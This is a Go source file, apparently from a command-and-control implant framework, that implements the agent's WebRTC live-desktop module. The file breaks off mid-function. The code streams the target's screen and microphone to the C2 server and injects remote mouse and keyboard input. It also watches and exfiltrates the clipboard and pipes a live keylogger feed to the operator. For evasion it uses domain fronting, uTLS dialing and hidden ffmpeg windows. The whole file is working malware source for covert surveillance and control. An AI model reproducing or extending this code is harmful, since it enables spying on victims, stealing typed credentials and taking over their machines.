//go:build linux || windows || darwin
// +build linux windows darwin

package main

// WebRTC live desktop agent side.
//
// This file is owned by the optional "webrtc" agent module. The generator
// drops it (and the Pion dependency) when the module is excluded, which keeps
// Pion out of agents that only need the JPEG screen stream.
//
// Flow: screen_webrtc_start opens a single-use signaling WebSocket to the C2
// server, creates a sendonly H.264 PeerConnection, and waits for the browser's
// offer. Once negotiated it starts ffmpeg, captures RTP on loopback, and feeds
// a Pion TrackLocalStaticRTP. Input events arrive on the same signaling socket
// and reuse the existing remoteInputDispatch implementation.

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/pion/rtp"
	"github.com/pion/webrtc/v4"
)

const (
	webRTCSignalReadLimit  = 512 * 1024
	webRTCSignalDeadline   = 5 * time.Minute
	webRTCSignalPingPeriod = 30 * time.Second
	// MaxDisplayIndex bounds the monitor selector on both ends: 0 means the
	// whole virtual desktop, 1..MaxDisplayIndex picks a monitor.
	MaxDisplayIndex = 8
)

type webRTCIceServer struct {
	URLs       []string `json:"urls"`
	Username   string   `json:"username,omitempty"`
	Credential string   `json:"credential,omitempty"`
}

type webRTCSettings struct {
	Width       int    `json:"width"`
	Height      int    `json:"height"`
	FPS         int    `json:"fps"`
	BitrateKbps int    `json:"bitrate_kbps"`
	Encoder     string `json:"encoder"`
	// Display selects what to capture: 0 (or absent) is the whole virtual
	// desktop, N>=1 is monitor N in the agent's announced order. The console
	// sends it in the start request, and the live "display" signal switches it.
	Display int `json:"display"`
	// Differential drops frames that are near-identical to their predecessor
	// (mpdecimate), so a static desktop stops costing a full frame rate while
	// every changed frame is still sent.
	Differential bool `json:"differential"`
	// Audio streams the target's microphone (or the first capture device) as
	// Opus on the same peer connection. The track is always negotiated; this
	// flag only controls whether a capture process is running.
	Audio bool `json:"audio"`
}

type webRTCAgentStartData struct {
	SessionID  string            `json:"session_id"`
	Token      string            `json:"token"`
	AgentID    string            `json:"agent_id"`
	Path       string            `json:"path"`
	IceServers []webRTCIceServer `json:"ice_servers"`
	Settings   webRTCSettings    `json:"settings"`
}

type webRTCSignal struct {
	Type      string          `json:"type"`
	SDP       string          `json:"sdp,omitempty"`
	Candidate json.RawMessage `json:"candidate,omitempty"`
	Event     json.RawMessage `json:"event,omitempty"`
	State     string          `json:"state,omitempty"`
	Reason    string          `json:"reason,omitempty"`
	// Display is the monitor switch requested by the console (0 = all).
	Display *int `json:"display,omitempty"`
	// Clipboard payloads: text is the value, enabled toggles change streaming.
	Text    string `json:"text,omitempty"`
	Enabled *bool  `json:"enabled,omitempty"`
	// Title is the optional dialog title for a chat message.
	Title string `json:"title,omitempty"`
	// Limit/Index address the bounded clipboard history.
	Limit *int `json:"limit,omitempty"`
	Index *int `json:"index,omitempty"`
}

type webRTCInputEvent struct {
	Type  string   `json:"type"`
	X     int      `json:"x"`
	Y     int      `json:"y"`
	Key   string   `json:"key"`
	Count int      `json:"count"`
	Delta int      `json:"delta"`
	Mods  []string `json:"mods"`
}

type agentWebRTCSession struct {
	id       string
	conn     *websocket.Conn
	pc       *webrtc.PeerConnection
	track    *webrtc.TrackLocalStaticRTP
	rtpConn  *net.UDPConn
	ffmpeg   string
	settings webRTCSettings
	ctx      context.Context
	cancel   context.CancelFunc

	writeMu   sync.Mutex
	cmdMu     sync.Mutex
	rtpMu     sync.Mutex
	captureMu sync.RWMutex
	// settingsMu guards the mutable settings (differential can be toggled live).
	settingsMu sync.RWMutex
	cmd        *exec.Cmd
	stopOnce   sync.Once
	// captureGen identifies the live ffmpeg process. A restart (display switch)
	// increments it, and the old process's Wait goroutine checks it before
	// reporting a failure: killing ffmpeg on purpose must not end the session.
	captureGen int

	// capture is the region ffmpeg encodes and input coordinates map into:
	// the whole virtual desktop or one monitor.
	capture   screenRect
	captureOK bool

	// inputErrAt rate-limits "input_rejected" reports; the signaling read loop
	// is the only writer.
	inputErrAt time.Time

	// Live clipboard: the watcher goroutine sends the target clipboard when it
	// changes, and an operator paste updates it without echoing back.
	clipMu       sync.Mutex
	clipWatch    bool
	clipLastHash string

	// Live audio: the Opus track is always negotiated so enabling audio later
	// needs no renegotiation; audioCmd is the capture process, when running.
	audioMu    sync.Mutex
	audioTrack *webrtc.TrackLocalStaticRTP
	audioCmd   *exec.Cmd
	audioConn  *net.UDPConn
	audioGen   int

	// Live keystroke feed: stream new keylog bytes to the operator while the
	// feed is on. keyStartedHere records whether THIS session started the
	// shared keylogger loop (so it is the only one that may stop it).
	keyMu          sync.Mutex
	keyFeedOn      bool
	keyStartedHere bool
	keySent        int
	keyPumpOnce    sync.Once
}

var (
	webRTCSessionMu     sync.Mutex
	webRTCSessionActive *agentWebRTCSession
)

func handleScreenWebRTCStart(task Task, res *TaskResult) {
	var data webRTCAgentStartData
	if err := json.Unmarshal([]byte(task.Data), &data); err != nil {
		res.Error = "screen_webrtc_start: invalid session payload"
		return
	}
	if err := startAgentWebRTC(data); err != nil {
		res.Error = "screen_webrtc_start: " + err.Error()
		return
	}
	res.Output = "webrtc: signaling connected; waiting for the operator offer"
}

func handleScreenWebRTCStop(task Task, res *TaskResult) {
	id := strings.TrimSpace(task.Data)
	if id == "" {
		id = strings.TrimSpace(task.Command)
	}
	if stopAgentWebRTC(id) {
		res.Output = "webrtc: stream stopped"
		return
	}
	res.Output = "webrtc: no active stream"
}

func stopAgentWebRTC(id string) bool {
	webRTCSessionMu.Lock()
	s := webRTCSessionActive
	if s == nil || (id != "" && !strings.EqualFold(id, s.id)) {
		webRTCSessionMu.Unlock()
		return false
	}
	webRTCSessionMu.Unlock()
	s.stop("stop requested")
	return true
}

func startAgentWebRTC(data webRTCAgentStartData) error {
	if strings.TrimSpace(data.SessionID) == "" || strings.TrimSpace(data.Token) == "" {
		return fmt.Errorf("missing session id or signaling token")
	}
	settings := data.Settings
	if settings.Width == 0 && settings.Height == 0 {
		settings.Width, settings.Height = 1280, 720
	}
	if settings.FPS <= 0 {
		settings.FPS = 30
	}
	if settings.BitrateKbps <= 0 {
		settings.BitrateKbps = 2500
	}
	if settings.Width < 640 || settings.Width > 1920 || settings.Height < 360 || settings.Height > 1080 {
		return fmt.Errorf("unsupported dimensions %dx%d (1080p maximum)", settings.Width, settings.Height)
	}
	if settings.Width%2 != 0 || settings.Height%2 != 0 {
		return fmt.Errorf("dimensions must be even")
	}
	if settings.FPS < 15 || settings.FPS > 30 {
		return fmt.Errorf("unsupported frame rate %d", settings.FPS)
	}
	if settings.BitrateKbps < 500 || settings.BitrateKbps > 8000 {
		return fmt.Errorf("unsupported bitrate %d", settings.BitrateKbps)
	}
	settings.Encoder = normalizeAgentEncoder(settings.Encoder)
	if settings.Display < 0 || settings.Display > MaxDisplayIndex {
		return fmt.Errorf("unsupported display index %d (0 = all displays)", settings.Display)
	}
	data.Settings = settings

	// Resolve the requested display BEFORE connecting: a monitor index that
	// does not exist must fail the task with a reason the operator can act on,
	// not start a stream of the wrong screen.
	capture, hasCapture := resolveCaptureRect(settings.Display)
	if !hasCapture {
		if settings.Display > 0 {
			return fmt.Errorf("display %d is not available (this host reports %d display(s))",
				settings.Display, len(nativeScreenRects()))
		}
		return fmt.Errorf("screen geometry is unavailable; cannot choose a capture region")
	}

	ffmpeg := findFFmpegBinary()
	if ffmpeg == "" {
		return fmt.Errorf("ffmpeg not found (install ffmpeg or set FORGEC2_FFMPEG to its full path)")
	}

	ctx, cancel := context.WithCancel(context.Background())
	sess := &agentWebRTCSession{
		id:        data.SessionID,
		ffmpeg:    ffmpeg,
		settings:  settings,
		ctx:       ctx,
		cancel:    cancel,
		capture:   capture,
		captureOK: true,
		// Live clipboard is on by default: the operator opened a remote-control
		// page, and the first frame shows what the target already holds.
		clipWatch: true,
	}
	webRTCSessionMu.Lock()
	if webRTCSessionActive != nil {
		webRTCSessionMu.Unlock()
		cancel()
		return fmt.Errorf("a WebRTC stream is already active")
	}
	webRTCSessionActive = sess
	webRTCSessionMu.Unlock()

	if err := sess.connect(data); err != nil {
		sess.stop("connect failed")
		return err
	}
	go sess.readLoop()
	go sess.clipboardWatcher()
	return nil
}

func normalizeAgentEncoder(encoder string) string {
	switch strings.ToLower(strings.TrimSpace(encoder)) {
	case "h264_nvenc", "h264_qsv", "h264_amf", "h264_videotoolbox", "libx264":
		return strings.ToLower(strings.TrimSpace(encoder))
	default:
		return "libx264"
	}
}

func findFFmpegBinary() string {
	if p := strings.TrimSpace(os.Getenv("FORGEC2_FFMPEG")); p != "" {
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return p
		}
	}
	if p, err := exec.LookPath("ffmpeg"); err == nil {
		return p
	}
	if runtime.GOOS == "windows" {
		if p, err := exec.LookPath("ffmpeg.exe"); err == nil {
			return p
		}
		if exe, err := os.Executable(); err == nil {
			p := filepath.Join(filepath.Dir(exe), "ffmpeg.exe")
			if st, statErr := os.Stat(p); statErr == nil && !st.IsDir() {
				return p
			}
		}
	}
	return ""
}

func (s *agentWebRTCSession) connect(data webRTCAgentStartData) error {
	conn, err := dialAgentSignaling(data)
	if err != nil {
		return err
	}
	s.conn = conn
	conn.SetReadLimit(webRTCSignalReadLimit)
	_ = conn.SetReadDeadline(time.Now().Add(webRTCSignalDeadline))
	conn.SetPongHandler(func(string) error {
		return conn.SetReadDeadline(time.Now().Add(webRTCSignalDeadline))
	})

	media := &webrtc.MediaEngine{}
	if err := media.RegisterDefaultCodecs(); err != nil {
		return fmt.Errorf("media codecs: %w", err)
	}
	api := webrtc.NewAPI(webrtc.WithMediaEngine(media))
	iceServers := make([]webrtc.ICEServer, 0, len(data.IceServers))
	for _, srv := range data.IceServers {
		if len(srv.URLs) == 0 {
			continue
		}
		iceServers = append(iceServers, webrtc.ICEServer{
			URLs:           srv.URLs,
			Username:       srv.Username,
			Credential:     srv.Credential,
			CredentialType: webrtc.ICECredentialTypePassword,
		})
	}
	pc, err := api.NewPeerConnection(webrtc.Configuration{
		ICEServers:         iceServers,
		ICETransportPolicy: webrtc.ICETransportPolicyAll,
	})
	if err != nil {
		return fmt.Errorf("peer connection: %w", err)
	}
	s.pc = pc
	track, err := webrtc.NewTrackLocalStaticRTP(webrtc.RTPCodecCapability{
		MimeType:  webrtc.MimeTypeH264,
		ClockRate: 90000,
	}, "video", "screen")
	if err != nil {
		return fmt.Errorf("video track: %w", err)
	}
	s.track = track
	sender, err := pc.AddTrack(track)
	if err != nil {
		return fmt.Errorf("add video track: %w", err)
	}
	go func() {
		buf := make([]byte, 1500)
		for {
			if _, _, readErr := sender.Read(buf); readErr != nil {
				return
			}
		}
	}()

	// Audio track: negotiated unconditionally so the console always has an
	// audio m-line. Without a capture process it simply carries no packets.
	audioTrack, err := webrtc.NewTrackLocalStaticRTP(webrtc.RTPCodecCapability{
		MimeType:  webrtc.MimeTypeOpus,
		ClockRate: audioSampleRate,
		Channels:  1,
	}, "audio", "desktop")
	if err != nil {
		return fmt.Errorf("audio track: %w", err)
	}
	s.audioTrack = audioTrack
	if _, err := pc.AddTrack(audioTrack); err != nil {
		return fmt.Errorf("add audio track: %w", err)
	}

	pc.OnICECandidate(func(c *webrtc.ICECandidate) {
		if c == nil || s.ctx.Err() != nil {
			return
		}
		_ = s.sendJSON(map[string]any{"type": "ice", "candidate": c.ToJSON()})
	})
	pc.OnConnectionStateChange(func(state webrtc.PeerConnectionState) {
		switch state {
		case webrtc.PeerConnectionStateConnected:
			_ = s.sendJSON(map[string]any{"type": "state", "state": "connected"})
			// Start ffmpeg only once media transport is up, otherwise the
			// first IDR (and its SPS/PPS) is dropped by the track and the
			// browser shows black until the next keyframe.
			go s.ensurePipeline()
			if s.settingsSnapshot().Audio {
				go func() {
					if err := s.startAudioPipeline(); err != nil {
						_ = s.sendJSON(map[string]any{"type": "audio", "enabled": false, "reason": err.Error()})
					}
				}()
			}
		case webrtc.PeerConnectionStateFailed:
			_ = s.sendJSON(map[string]any{"type": "error", "reason": "WebRTC connection failed"})
			go s.stop("connection failed")
		case webrtc.PeerConnectionStateDisconnected:
			_ = s.sendJSON(map[string]any{"type": "state", "state": "disconnected"})
		}
	})

	_ = s.sendJSON(map[string]any{"type": "state", "state": "waiting_for_offer"})
	// Announce the displays so the console can offer a monitor picker. This is
	// a `state` frame, which the server already forwards verbatim, so a client
	// that predates the picker simply ignores it.
	rects := nativeScreenRects()
	if virtual, ok := s.captureSnapshot(); ok {
		_ = s.sendJSON(map[string]any{
			"type":     "state",
			"state":    "displays",
			"displays": displayDescriptors(rects),
			"virtual": map[string]int{
				"x": virtual.X, "y": virtual.Y, "width": virtual.Width, "height": virtual.Height,
			},
			"selected": s.settingsSnapshot().Display,
		})
	}
	return nil
}

// captureSnapshot returns the current capture region under the lock.
func (s *agentWebRTCSession) captureSnapshot() (screenRect, bool) {
	s.captureMu.RLock()
	defer s.captureMu.RUnlock()
	return s.capture, s.captureOK
}

// switchDisplay changes the captured monitor without ending the session: the
// capture region is updated, ffmpeg is restarted against it, and the input
// mapper immediately scales against the new rectangle. A rejected index is
// reported the same way as a rejected key: visible, non-fatal.
func (s *agentWebRTCSession) switchDisplay(display int) {
	rects := nativeScreenRects()
	capture, ok := selectScreenRect(rects, screenRectFromNative(), hasNativeScreenRect(), display)
	if !ok {
		_ = s.sendJSON(map[string]any{
			"type":   "input_error",
			"reason": fmt.Sprintf("display %d is not available (this host reports %d display(s))", display, len(rects)),
		})
		return
	}
	s.captureMu.Lock()
	s.capture = capture
	s.captureOK = true
	s.captureMu.Unlock()
	s.settingsMu.Lock()
	s.settings.Display = display
	s.settingsMu.Unlock()

	s.stopCapture()
	// ensurePipeline already fired for this session, so restart directly: it
	// must NOT re-run the once-guard or the new display would never be captured.
	if err := s.startRTPPipeline(); err != nil {
		_ = s.sendJSON(map[string]any{"type": "error", "reason": "display switch: " + err.Error()})
		s.stop("display switch failed")
		return
	}
	_ = s.sendJSON(map[string]any{"type": "state", "state": "display", "selected": display})
}

func dialAgentSignaling(data webRTCAgentStartData) (*websocket.Conn, error) {
	urls := c2URLsSnapshot()
	if len(urls) == 0 {
		return nil, fmt.Errorf("no C2 URL configured")
	}
	path := strings.TrimSpace(data.Path)
	if path == "" {
		path = "/ws/rd/agent"
	}
	start := int(currentC2Idx.Load())
	if start < 0 || start >= len(urls) {
		start = 0
	}
	var lastErr error
	for i := 0; i < len(urls); i++ {
		c2 := urls[(start+i)%len(urls)]
		wsURL, err := buildAgentSignalURL(c2, path, data.SessionID, data.Token, agentUUID)
		if err != nil {
			lastErr = err
			continue
		}
		dialer := &websocket.Dialer{HandshakeTimeout: 10 * time.Second}
		if strings.HasPrefix(wsURL, "wss://") {
			dialer.NetDialContext = utlsDialContext
		}
		header := http.Header{}
		if DomainFront != "" {
			header.Set("Host", DomainFront)
		}
		header.Set("User-Agent", getActiveUserAgentFromConfig())
		for k, v := range getActiveHeaders() {
			if strings.EqualFold(k, "User-Agent") {
				continue
			}
			header.Set(k, v)
		}
		conn, resp, err := dialer.Dial(wsURL, header)
		if err != nil {
			if resp != nil {
				noteServerClock(resp.Header)
			}
			lastErr = err
			continue
		}
		if resp != nil {
			noteServerClock(resp.Header)
		}
		return conn, nil
	}
	if lastErr == nil {
		lastErr = fmt.Errorf("no usable C2 URL")
	}
	return nil, fmt.Errorf("signaling connect failed: %w", lastErr)
}

func buildAgentSignalURL(c2URL, path, sessionID, token, agentID string) (string, error) {
	path = strings.TrimSpace(path)
	if path == "" {
		path = "/ws/rd/agent"
	}
	if !strings.HasPrefix(path, "/") || strings.HasPrefix(path, "//") {
		return "", fmt.Errorf("invalid signaling path %q", path)
	}
	u, err := url.Parse(strings.TrimSpace(c2URL))
	if err != nil {
		return "", err
	}
	scheme := ""
	switch strings.ToLower(u.Scheme) {
	case "https", "wss":
		scheme = "wss"
	case "http", "ws":
		scheme = "ws"
	default:
		return "", fmt.Errorf("unsupported C2 URL scheme %q", u.Scheme)
	}
	host := u.Host
	if host == "" {
		return "", fmt.Errorf("C2 URL has no host")
	}
	q := url.Values{}
	q.Set("session", sessionID)
	q.Set("token", token)
	if agentID != "" {
		q.Set("agent", agentID)
	}
	return scheme + "://" + host + path + "?" + q.Encode(), nil
}

func (s *agentWebRTCSession) sendJSON(v any) error {
	if s.conn == nil {
		return fmt.Errorf("signaling socket closed")
	}
	s.writeMu.Lock()
	defer s.writeMu.Unlock()
	_ = s.conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	return s.conn.WriteJSON(v)
}

// reportInputError tells the operator that one input event did not land. It is
// rate-limited because a rejected key repeats while the operator holds it, and
// it deliberately does NOT end the session: a key the agent does not know is
// not a reason to tear down a live desktop.
func (s *agentWebRTCSession) reportInputError(err error) {
	now := time.Now()
	if !s.inputErrAt.IsZero() && now.Sub(s.inputErrAt) < time.Second {
		return
	}
	s.inputErrAt = now
	_ = s.sendJSON(map[string]any{"type": "input_error", "reason": err.Error()})
}

// settingsSnapshot returns a copy of the mutable settings for one pipeline
// start (differential can change while a session is live).
func (s *agentWebRTCSession) settingsSnapshot() webRTCSettings {
	s.settingsMu.RLock()
	defer s.settingsMu.RUnlock()
	return s.settings
}

// setDifferential switches the change-only capture mode. A running pipeline is
// restarted against the new filter chain; before the stream starts the value
// simply applies when it does.
func (s *agentWebRTCSession) setDifferential(enabled bool) {
	s.settingsMu.Lock()
	changed := s.settings.Differential != enabled
	s.settings.Differential = enabled
	s.settingsMu.Unlock()

	_ = s.sendJSON(map[string]any{"type": "differential", "enabled": enabled})
	if !changed {
		return
	}
	s.cmdMu.Lock()
	running := s.cmd != nil
	s.cmdMu.Unlock()
	if !running {
		return
	}
	s.stopCapture()
	if err := s.startRTPPipeline(); err != nil {
		_ = s.sendJSON(map[string]any{"type": "error", "reason": "differential switch: " + err.Error()})
		s.stop("differential switch failed")
	}
}

// scaleInput maps browser coordinates from the encoded video back to native
// screen pixels. ffmpeg pads and scales the CAPTURED REGION to
// settings.Width/Height, so forwarding the video coordinates unchanged would
// target the wrong place on any display larger than the stream (for example
// 1080p at the 720p preset) and on every monitor other than the first.
func (s *agentWebRTCSession) scaleInput(raw []byte) []byte {
	capture, ok := s.captureSnapshot()
	settings := s.settingsSnapshot()
	return mapWebRTCInput(raw, capture.X, capture.Y, capture.Width, capture.Height, settings.Width, settings.Height, ok)
}

// mapWebRTCInput is the testable half of scaleInput. It only rewrites pointer
// events; keyboard events and malformed input pass through unchanged. The
// event struct carries EVERY field the operator can set, because re-marshalling
// a struct that omits count/delta/mods silently drops them before injection.
func mapWebRTCInput(raw []byte, screenX, screenY, screenW, screenH, streamW, streamH int, haveScreen bool) []byte {
	if !haveScreen || screenW <= 0 || screenH <= 0 || streamW <= 0 || streamH <= 0 {
		return raw
	}
	var ev webRTCInputEvent
	if err := json.Unmarshal(raw, &ev); err != nil {
		return raw
	}
	switch strings.ToLower(ev.Type) {
	case "move", "click", "click_right", "click_middle", "wheel":
	default:
		return raw
	}
	// ffmpeg scales the capture with force_original_aspect_ratio=decrease and
	// pads to the stream size. Mirror that letterbox so non-16:9 screens map
	// correctly instead of treating the black bars as desktop pixels.
	contentW, contentH := streamW, streamH
	if screenW*streamH > streamW*screenH {
		contentH = streamW * screenH / screenW
	} else if screenW*streamH < streamW*screenH {
		contentW = streamH * screenW / screenH
	}
	if contentW <= 0 {
		contentW = 1
	}
	if contentH <= 0 {
		contentH = 1
	}
	offsetX := (streamW - contentW) / 2
	offsetY := (streamH - contentH) / 2
	ev.X = scaleWebRTCCoord(ev.X, screenX, screenW, contentW, offsetX)
	ev.Y = scaleWebRTCCoord(ev.Y, screenY, screenH, contentH, offsetY)
	out, err := json.Marshal(ev)
	if err != nil {
		return raw
	}
	return out
}

func scaleWebRTCCoord(value, origin, screenSize, contentSize, offset int) int {
	scaled := origin + ((value-offset)*screenSize+contentSize/2)/contentSize
	if scaled < origin {
		return origin
	}
	if max := origin + screenSize - 1; scaled > max {
		return max
	}
	return scaled
}

func (s *agentWebRTCSession) readLoop() {
	defer s.stop("signaling closed")
	pingDone := make(chan struct{})
	defer close(pingDone)
	go func() {
		ticker := time.NewTicker(webRTCSignalPingPeriod)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				_ = s.conn.WriteControl(websocket.PingMessage, nil, time.Now().Add(5*time.Second))
			case <-pingDone:
				return
			}
		}
	}()

	var pendingICE []webrtc.ICECandidateInit
	remoteSet := false
	for {
		_, raw, err := s.conn.ReadMessage()
		if err != nil {
			return
		}
		_ = s.conn.SetReadDeadline(time.Now().Add(webRTCSignalDeadline))
		var msg webRTCSignal
		if err := json.Unmarshal(raw, &msg); err != nil {
			continue
		}
		switch strings.ToLower(msg.Type) {
		case "offer":
			if remoteSet {
				continue
			}
			if !strings.Contains(strings.ToUpper(msg.SDP), "H264") {
				_ = s.sendJSON(map[string]any{"type": "error", "reason": "browser offer does not include H.264"})
				return
			}
			if err := s.pc.SetRemoteDescription(webrtc.SessionDescription{Type: webrtc.SDPTypeOffer, SDP: msg.SDP}); err != nil {
				_ = s.sendJSON(map[string]any{"type": "error", "reason": "set offer: " + err.Error()})
				return
			}
			remoteSet = true
			for _, cand := range pendingICE {
				if err := s.pc.AddICECandidate(cand); err != nil {
					break
				}
			}
			pendingICE = nil
			answer, err := s.pc.CreateAnswer(nil)
			if err != nil {
				_ = s.sendJSON(map[string]any{"type": "error", "reason": "create answer: " + err.Error()})
				return
			}
			if err := s.pc.SetLocalDescription(answer); err != nil {
				_ = s.sendJSON(map[string]any{"type": "error", "reason": "set answer: " + err.Error()})
				return
			}
			if err := s.sendJSON(map[string]any{"type": "answer", "sdp": answer.SDP}); err != nil {
				return
			}
			// The pipeline starts from OnConnectionStateChange(connected).
		case "ice":
			if len(msg.Candidate) == 0 {
				continue
			}
			var cand webrtc.ICECandidateInit
			if err := json.Unmarshal(msg.Candidate, &cand); err != nil {
				continue
			}
			if !remoteSet {
				pendingICE = append(pendingICE, cand)
				continue
			}
			_ = s.pc.AddICECandidate(cand)
		case "input":
			if len(msg.Event) > 0 {
				// The dispatch result used to be discarded, so an injection that
				// failed (unknown key, no xdotool, a VOID Win32 call checked as
				// BOOL) looked exactly like a click that landed. Report it, at
				// most once a second, without ending the session.
				if _, err := remoteInputDispatch(string(s.scaleInput(msg.Event))); err != nil {
					s.reportInputError(err)
				}
			}
		case "display":
			if msg.Display == nil {
				continue
			}
			s.switchDisplay(*msg.Display)
		case "clipboard_get":
			s.publishClipboard(true)
		case "clipboard_set":
			// The OS write can block (xclip hands the selection to a helper),
			// so it must not stall input handling on the read loop.
			text := msg.Text
			go s.applyClipboardSet(text)
		case "clipboard_watch":
			if msg.Enabled != nil {
				s.setClipboardWatch(*msg.Enabled)
			}
		case "clipboard_history":
			limit := clipboardHistoryPage
			if msg.Limit != nil {
				limit = *msg.Limit
			}
			s.clipboardHistoryList(limit)
		case "clipboard_history_get":
			if msg.Index == nil {
				continue
			}
			s.clipboardHistoryFetch(*msg.Index)
		case "message":
			// A dialog blocks until the user dismisses it, so it must not run
			// on the read loop (input and clipboard would stop responding).
			text, title := msg.Text, msg.Title
			go s.deliverMessage(title, text)
		case "keys":
			if msg.Enabled == nil {
				continue
			}
			s.setKeyFeed(*msg.Enabled)
		case "differential":
			if msg.Enabled == nil {
				continue
			}
			s.setDifferential(*msg.Enabled)
		case "audio":
			if msg.Enabled == nil {
				continue
			}
			s.setAudio(*msg.Enabled)
		case "stop", "session_end":
			return
		}
	}
}

func (s *agentWebRTCSession) ensurePipeline() {
	if err := s.startRTPPipeline(); err != nil {
		_ = s.sendJSON(map[string]any{"type": "error", "reason": err.Error()})
		s.stop("pipeline failed")
	}
}

// stopCapture kills the current ffmpeg and its RTP sink without ending the
// session. A display switch uses it before starting the new region; the
// generation counter keeps the dying process's Wait goroutine from reporting a
// failure that tears the session down.
func (s *agentWebRTCSession) stopCapture() {
	s.cmdMu.Lock()
	s.captureGen++
	cmd := s.cmd
	s.cmd = nil
	s.cmdMu.Unlock()

	s.rtpMu.Lock()
	rtpConn := s.rtpConn
	s.rtpConn = nil
	s.rtpMu.Unlock()
	if rtpConn != nil {
		_ = rtpConn.Close()
	}
	if cmd != nil && cmd.Process != nil {
		_ = cmd.Process.Kill()
	}
}

func (s *agentWebRTCSession) startRTPPipeline() error {
	if s.ctx.Err() != nil {
		return fmt.Errorf("WebRTC session is already closed")
	}
	if s.track == nil {
		return fmt.Errorf("video track is not initialized")
	}
	conn, err := net.ListenUDP("udp4", &net.UDPAddr{IP: net.IPv4(127, 0, 0, 1), Port: 0})
	if err != nil {
		return fmt.Errorf("RTP listener: %w", err)
	}
	s.rtpMu.Lock()
	s.rtpConn = conn
	s.rtpMu.Unlock()
	go func() {
		buf := make([]byte, 2048)
		for {
			n, _, readErr := conn.ReadFromUDP(buf)
			if readErr != nil {
				return
			}
			var pkt rtp.Packet
			if err := pkt.Unmarshal(buf[:n]); err != nil {
				continue
			}
			if err := s.track.WriteRTP(&pkt); err != nil {
				return
			}
		}
	}()

	if s.ctx.Err() != nil {
		_ = conn.Close()
		return fmt.Errorf("WebRTC session is already closed")
	}
	capture, hasCapture := s.captureSnapshot()
	if !hasCapture {
		_ = conn.Close()
		return fmt.Errorf("screen geometry is unavailable")
	}
	args, err := buildScreenFFmpegArgs(s.settingsSnapshot(), conn.LocalAddr().(*net.UDPAddr).Port, capture, hasCapture)
	if err != nil {
		_ = conn.Close()
		return err
	}
	cmd := exec.CommandContext(s.ctx, s.ffmpeg, args...)
	applyHideWindow(cmd)
	stderr := &cappedBuffer{max: 4096}
	cmd.Stderr = stderr
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("ffmpeg start: %w", err)
	}
	s.cmdMu.Lock()
	s.cmd = cmd
	gen := s.captureGen
	s.cmdMu.Unlock()
	_ = s.sendJSON(map[string]any{"type": "state", "state": "streaming"})
	go func() {
		waitErr := cmd.Wait()
		if s.ctx.Err() != nil {
			return
		}
		// A display switch killed this process on purpose; its successor owns
		// the session now.
		s.cmdMu.Lock()
		stale := s.captureGen != gen
		s.cmdMu.Unlock()
		if stale {
			return
		}
		reason := strings.TrimSpace(stderr.String())
		if reason == "" && waitErr != nil {
			reason = waitErr.Error()
		}
		if reason == "" {
			reason = "ffmpeg exited before the stream was stopped"
		}
		if len(reason) > 500 {
			reason = reason[:500]
		}
		_ = s.sendJSON(map[string]any{"type": "error", "reason": "ffmpeg: " + reason})
		s.stop("ffmpeg exited")
	}()
	return nil
}

func (s *agentWebRTCSession) stop(reason string) {
	s.stopOnce.Do(func() {
		// The live keystroke feed owns the keylogger only if it started it.
		s.setKeyFeed(false)
		s.stopAudio()
		webRTCSessionMu.Lock()
		if webRTCSessionActive == s {
			webRTCSessionActive = nil
		}
		webRTCSessionMu.Unlock()
		s.cancel()
		if s.conn != nil {
			_ = s.conn.WriteControl(websocket.CloseMessage,
				websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""),
				time.Now().Add(time.Second))
			_ = s.conn.Close()
		}
		if s.pc != nil {
			_ = s.pc.Close()
		}
		s.rtpMu.Lock()
		rtpConn := s.rtpConn
		s.rtpConn = nil
		s.rtpMu.Unlock()
		if rtpConn != nil {
			_ = rtpConn.Close()
		}
		s.cmdMu.Lock()
		cmd := s.cmd
		s.cmd = nil
		s.cmdMu.Unlock()
		if cmd != nil && cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
		_ = reason
	})
}

func buildScreenFFmpegArgs(settings webRTCSettings, rtpPort int, capture screenRect, hasCapture bool) ([]string, error) {
	if rtpPort <= 0 || rtpPort > 65535 {
		return nil, fmt.Errorf("invalid RTP port")
	}
	args := []string{"-hide_banner", "-loglevel", "error", "-nostdin"}
	switch runtime.GOOS {
	case "windows":
		// gdigrab captures the whole desktop by default. A selected monitor is
		// a region of it: -offset_x/-offset_y move into the virtual desktop
		// (negative for a monitor left of / above the primary) and -video_size
		// bounds it.
		args = append(args, "-f", "gdigrab", "-framerate", fmt.Sprintf("%d", settings.FPS), "-draw_mouse", "1")
		if hasCapture {
			args = append(args,
				"-offset_x", fmt.Sprintf("%d", capture.X),
				"-offset_y", fmt.Sprintf("%d", capture.Y),
				"-video_size", fmt.Sprintf("%dx%d", capture.Width, capture.Height))
		}
		args = append(args, "-i", "desktop")
	case "linux":
		display := strings.TrimSpace(os.Getenv("DISPLAY"))
		if display == "" {
			display = ":0.0"
		}
		size := linuxScreenSize()
		if size == "" {
			size = fmt.Sprintf("%dx%d", settings.Width, settings.Height)
		}
		offset := "+0,0"
		if hasCapture {
			size = fmt.Sprintf("%dx%d", capture.Width, capture.Height)
			offset = fmt.Sprintf("+%d,%d", capture.X, capture.Y)
		}
		args = append(args, "-f", "x11grab", "-framerate", fmt.Sprintf("%d", settings.FPS),
			"-draw_mouse", "1", "-video_size", size, "-i", display+offset)
	case "darwin":
		args = append(args, "-f", "avfoundation", "-framerate", fmt.Sprintf("%d", settings.FPS),
			"-capture_cursor", "1", "-i", "1:none")
	default:
		return nil, fmt.Errorf("unsupported platform %s", runtime.GOOS)
	}

	level := "3.1"
	if settings.Width*settings.Height > 1280*720 {
		level = "4.0"
	}
	// Differential mode: mpdecimate drops frames that are near-identical to
	// their predecessor, and -fps_mode vfr keeps the surviving frames on their
	// original timestamps (without it ffmpeg duplicates the dropped frames back
	// to the input rate and the saving disappears). It goes FIRST in the chain:
	// decimating after scaling would compare already-resampled pixels.
	filters := make([]string, 0, 4)
	if settings.Differential {
		filters = append(filters, "mpdecimate")
	}
	filters = append(filters,
		fmt.Sprintf("scale=%d:%d:force_original_aspect_ratio=decrease", settings.Width, settings.Height),
		fmt.Sprintf("pad=%d:%d:(ow-iw)/2:(oh-ih)/2", settings.Width, settings.Height),
